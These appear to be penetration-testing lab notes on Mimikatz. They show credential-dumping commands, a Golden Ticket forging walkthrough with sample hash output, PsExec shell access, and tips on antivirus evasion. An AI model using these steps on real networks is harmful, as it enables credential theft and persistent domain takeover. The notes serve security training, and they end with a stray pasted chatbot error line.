> [!important] This tool is ideal under the assumption that you have compromised a domain controller

# Mimikatz Overview

---

### **Introduction to Mimikatz**

### **What is Mimikatz?**

- **Mimikatz** is a powerful tool designed to:
    - View and extract credentials stored in memory.
    - Perform advanced attacks related to authentication and persistence.
- **Primary Capabilities**:
    - Credential dumping.
    - Pass-the-hash and over-pass-the-hash attacks.
    - Pass-the-ticket, Golden Ticket, and Silver Ticket generation.
    - Kerberos ticket extraction and generation.
    - Other advanced persistence techniques.

---

### **Getting Started with Mimikatz**

1. **Origin and Background**:
    - Created by **Benjamin Delpy** from France.
    - Name translates to "cute cats" in French.
2. **Important Considerations**:
    - **Antivirus Detection**:
        - Mimikatz often triggers antivirus alerts as it is considered a hacking tool.
        - Use PowerShell alternatives like `Invoke-Mimikatz` for better evasion.
    - **System Compatibility**:
        - Tool updates and Windows patches create a cat-and-mouse scenario.
        - Ensure you use the latest Mimikatz version to avoid issues.
3. **Usage Scenarios**:
    - Download and execute directly on a **compromised system**.
    - Use via PowerShell (`Invoke-Mimikatz`) for in-memory execution.
4. **Downloading Mimikatz**:
    - Visit the official [Mimikatz GitHub repository](https://github.com/gentilkiwi/mimikatz).
    - Download precompiled binaries under `Binaries are available`:
        - Example: `mimikatz_trunk.zip`.
    - If downloading directly:
        - Antivirus tools (e.g., Defender) may block it. Disable them temporarily.
        - For ease, download it directly to the compromised domain controller.

---

### **Advanced Capabilities of Mimikatz**

1. **Credential Attacks**:
    - Plaintext password extraction.
    - Hash and Kerberos ticket extraction.
2. **Key Attacks Supported**:
    - **Pass-the-Hash**: Utilize NTLM hashes for authentication.
    - **Pass-the-Ticket**: Leverage extracted Kerberos tickets.
    - **Golden Ticket**: Generate a forged ticket with Domain Admin privileges.
    - **Silver Ticket**: Focus on specific services within a domain.

---

### **Why Use Mimikatz?**

1. **Post-Exploitation Tool**:
    - Works after compromising a system, especially a domain controller.
    - Useful for gaining persistence and escalating privileges.
2. **Common Use Cases**:
    - Extract credentials after compromising a Windows system.
    - Generate and manipulate Kerberos tickets.
    - Establish long-term access via Golden Tickets.

---

# Credential Dumping with Mimikatz

---

### **Mimikatz Usage for Credential Dumping**

### **Environment Setup**

- **Execution Environment**: Mimikatz is executed on a compromised **domain controller** or another target.
- **Steps Before Running Mimikatz**:
    1. Extract the contents of the downloaded **Mimikatz** zip file.
    2. Navigate to the directory containing `mimikatz.exe`.
        
        ![[/image 64.png|image 64.png]]
        
    3. Execute Mimikatz in a command prompt.
        
        ```Bash
        C:\Users\Administrator\Desktop\mimikatz_trunk\x64> mimikatz.exe
        
          .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
         .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
         ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
         ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
         '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
          '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
        
        mimikatz #
        ```
        

---

### **Common Commands in Mimikatz**

1. **Privilege Elevation**:
    - Always start with elevating privileges to avoid memory protection errors:
        
        ```Shell
        privilege::debug
        ```
        
    - **Output**: Look for `Privilege '20' OK`.
2. **Dump Credentials with** `**logonpasswords**`:
    - Dumps stored credentials, including:
        - Usernames.
        - NTLM hashes.
        - Cleartext passwords (if available).
    - Command:
        
        ```Shell
        sekurlsa::logonpasswords
        ```
        
    - **Key Notes**:
        - If targeting a **workstation**, this displays all logged-in user credentials since the last reboot.
        - Identifies NTLM hashes for potential **Pass-the-Hash** attacks.
3. **Dump Local Security Authority (LSA) Secrets**:
    - Extract LSA secrets for advanced attacks:
        
        ```Shell
        sekurlsa::lsa /patch
        ```
        
    - **What it extracts**:
        - NTLM hashes.
        - Kerberos Ticket Granting Ticket (TGT) information.
4. **Dump Security Accounts Manager (SAM) Database**:
    - Command:
        
        ```Shell
        lsadump::sam
        ```
        
    - If unsuccessful, other tools (e.g., `secretsdump.py`) may be required.
5. Dump Security Accounts Manager (SAM) with Patchs
    - Command
        
        ```Bash
        lsadump::lsa /patch
        ```
        
        - This will provide the username and NTLM hashes
        - You can take these hashes offline and crack them using hashcat
        - **Offline Cracking of Extracted NTLM Hashes**:
            - Extract hashes and crack them offline using tools like `hashcat`:
                
                ```Shell
                hashcat -m 1000 <hashfile> <wordlist>
                ```
                
            - Cracking results provide insights into password strength.
    - Why this is important?
        1. You take these hashes offline and cracking them
            1. You need to see the percentage that you want to crack
            2. You can relay this back the client that you have cracked the majority of the password and identify what passwords are strong and what passwords are weak
            3. This is an assessment on their password policy
6. Download the ntds.dit
    

---

### **Advanced Features**

1. **Wdigest Credentials**:
    - Wdigest stores plaintext passwords for active users.
    - From **Windows 8+**, Wdigest is disabled by default but can be re-enabled:
        
        ```Shell
        sekurlsa::wdigest /patch
        ```
        
    - Wait for a user to log out and back in to capture their plaintext password.
2. **Golden Ticket Attack**:
    - Requires Kerberos TGT data for forging domain admin credentials.
    - Generates a ticket valid indefinitely.
    - Example command:
        
        ```Shell
        kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /krbtgt:<hash> /id:<id>
        ```
        

---

### **Best Practices**

1. **Reporting Password Strength**:
    - Determine percentage of cracked hashes to assess password policies.
    - Provide insights into password weaknesses or strengths to clients.
2. **Usage in Real-world Scenarios**:
    - Confirm the **administrator's hash** can be used for Pass-the-Hash or Pass-the-Ticket attacks.
    - Analyze if WDIGEST can be re-enabled for plaintext password extraction.

---

  

# Golden Ticket Attack

> [!important] When you have a Golden ticket, you have complete access to the domain controller

### **Golden Ticket and Pass-the-Ticket Attacks with Mimikatz**

### **What is a Golden Ticket?**

- **Golden Ticket** allows forging Kerberos Ticket Granting Tickets (TGTs).
- Requires the **KRBTGT account hash** obtained from the domain controller.
- Grants **complete access to the domain**:
    - Authenticate to any resource or system within the domain.
    - Achieve stealthy, persistent control without directly modifying user accounts.

---

### **Golden Ticket Attack Steps**

1. Initiate mimikatz on the Domain Controller
    
    - From cmd run the following
    
    ```Bash
    mimikatz.exe
    privilege::debug
    ```
    
2. **Dump KRBTGT Information**:
    - From Mimikatz, inject and target the **KRBTGT account**:
        
        ```Shell
        lsadump::lsa /inject /name:krbtgt
        ```
        
        ```Bash
        mimikatz # lsadump::lsa /inject /name:krbtgt
        Domain : MARVEL / S-1-5-21-1169423831-1230255408-155128205
        
        RID  : 000001f6 (502)
        User : krbtgt
        
         * Primary
            NTLM : 2c081f2e0bea2205c1ef18d973589b15
            LM   :
          Hash NTLM: 2c081f2e0bea2205c1ef18d973589b15
            ntlm- 0: 2c081f2e0bea2205c1ef18d973589b15
            lm  - 0: 65e4e9988016015ab5d8385b75ca5c18
        
         * WDigest
            01  88d844279eadd87ab071853770569d0c
            02  e98f06406fcc4e4c6c40f2195339c21f
            03  7a0e4c8dad5c98b7a7b39ee24902853f
            04  88d844279eadd87ab071853770569d0c
            05  e98f06406fcc4e4c6c40f2195339c21f
            06  37ee2626ebf385264f621862e52df5ab
            07  88d844279eadd87ab071853770569d0c
            08  674973620143c690c27cc3bf1ce871b9
            09  674973620143c690c27cc3bf1ce871b9
            10  37fad567e68135481b3724dd1543001f
            11  f5b01f4358e9630fb955535328fb6a98
            12  674973620143c690c27cc3bf1ce871b9
            13  9665b438e77131a9b0fd5783a5a60733
            14  f5b01f4358e9630fb955535328fb6a98
            15  c7087e61f4f56b58628b17831b516ed5
            16  c7087e61f4f56b58628b17831b516ed5
            17  d99944935a66956bd9c7d671f404efdd
            18  408d418d6092b6379ef72e1f353c8208
            19  91073f665f06933c9a88f0cf562a8a6c
            20  40e93e9331dadd7079a8ec1c597518b9
            21  8b1aeb9ca202d8e32b7ec47e3db97734
            22  8b1aeb9ca202d8e32b7ec47e3db97734
            23  4672eb6b155fdea2daf52c6d64ac3372
            24  5049c4a5065acb2ffb8264ad60cc4026
            25  5049c4a5065acb2ffb8264ad60cc4026
            26  22510dbf354f54715f1104bb2922f28a
            27  5dd1d23f22a2ea81dc50082773f84649
            28  e891cda264b513ba986dc22688345838
            29  e79bdad2d8d1377633a6cd2a1d3afe06
        
         * Kerberos
            Default Salt : MARVEL.LOCALkrbtgt
            Credentials
              des_cbc_md5       : 8f80523162b59e1f
        
         * Kerberos-Newer-Keys
            Default Salt : MARVEL.LOCALkrbtgt
            Default Iterations : 4096
            Credentials
              aes256_hmac       (4096) : 212d7b3d6b58d7a56ea0ef5cd02d4f3a64693d864e0bea29a4a4d652c28166b1
              aes128_hmac       (4096) : fcaa780e25cfe411d83a5213ae1202d3
              des_cbc_md5       (4096) : 8f80523162b59e1f
        
         * NTLM-Strong-NTOWF
            Random Value : 580d75465eef7e66b25669a98be05bef
        
        mimikatz #
        ```
        
    - Copy the following from the output into a text file:
        - **Domain SID**.
        - **NTLM hash** of the `KRBTGT` account.
            
            ```Bash
            SID: S-1-5-21-1169423831-1230255408-155128205
            NTLM: 2c081f2e0bea2205c1ef18d973589b15
            ```
            
3. **Generate the Golden Ticket**:
    - Command structure:
        
        ```Shell
        kerberos::golden /User:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<hash> /id:<id> /ptt
        ```
        
    - Example:
        
        ```Shell
        kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1169423831-1230255408-155128205 /krbtgt:2c081f2e0bea2205c1ef18d973589b15 /id:500 /ptt
        ```
        
    - Parameters:
        - `/user`: Arbitrary username (e.g., `Administrator` or `FakeUser123`).
        - `/domain`: Domain name (e.g., `Marvel.local`).
        - `/sid`: Security Identifier of the domain.
        - `/krbtgt`: NTLM hash of the `KRBTGT` account.
        - `/id`: RID (use `500` for Administrator account).
        - `/ptt`: Pass the Ticket to the current session.
    - What is this doing?
        
        - Basically generating a Golden ticket and passing it onto the next session
        
        ```Bash
        mimikatz # kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1169423831-1230255408-155128205 /krbtgt:2c081f2e0bea2205c1ef18d973589b15 /id:500 /ptt
        User      : Administrator
        Domain    : marvel.local (MARVEL)
        SID       : S-1-5-21-1169423831-1230255408-155128205
        User Id   : 500
        Groups Id : *513 512 520 518 519
        ServiceKey: 2c081f2e0bea2205c1ef18d973589b15 - rc4_hmac_nt
        Lifetime  : 1/8/2025 8:18:55 PM ; 1/6/2035 8:18:55 PM ; 1/6/2035 8:18:55 PM
        -> Ticket : ** Pass The Ticket **
        
         * PAC generated
         * PAC signed
         * EncTicketPart generated
         * EncTicketPart encrypted
         * KrbCred generated
        
        Golden ticket for 'Administrator @ marvel.local' successfully submitted for current session
        ```
        
4. **Verify Golden Ticket**:
    - Open a new command prompt with the ticket:
        
        ```Shell
        misc::cmd
        ```
        
    - Access resources within the domain (e.g., shares or remote systems):
        
        ```Shell
        dir \\<target_machine>\C$
        ```
        

---

### **Pass-the-Ticket Attack**

- **Purpose**:
    - Use an existing Kerberos ticket to authenticate with domain resources.
- **Execution**:
    - Mimikatz automatically passes the Golden Ticket when generated with `/ptt`.
    - Access any domain machine or shared resource using tools like:
        
        ```Shell
        psexec.py <user>@<target_machine>
        ```
        

---

### **Practical Use Case Example**

1. **Generate a Golden Ticket**:
    - Generate the ticket with `/ptt` for immediate session use.
2. **Access Remote Machine (Example)**:
    - Use the ticket to enumerate a remote machine:
        
        ```Shell
        dir \\TargetMachine\C$
        ```
        
3. **Gain a Shell (Using PSExec)**:
    - Download and use `psexec.exe` from Microsoft Sysinternals:
        
        ```Shell
        PsExec.exe \\TargetMachine -u Administrator cmd.exe
        ```
        
    - Authenticate seamlessly using the Golden Ticket.

---

### **Persistence with Golden Tickets**

- Golden Tickets enable **long-term domain access**.
- They remain valid until:
    1. The KRBTGT account hash is reset (twice for complete invalidation).
    2. Domain policies detect unusual Kerberos activity.

---

### **Final Notes**

1. Golden Tickets are **powerful but detectable**:
    - Organizations increasingly monitor for forged tickets.
    - Consider learning **Silver Ticket** techniques for stealthier attacks.
2. **Challenge**:
    - Extend this by:
        - Downloading and using `PsExec.exe`.
        - Enumerating resources and gaining a shell on a domain machine.

---

Save file: Download Golden_Ticket_Notes.txt

It seems like I can’t do more advanced data analysis right now. Please try again later. Let me know if there’s anything else I can assist you with!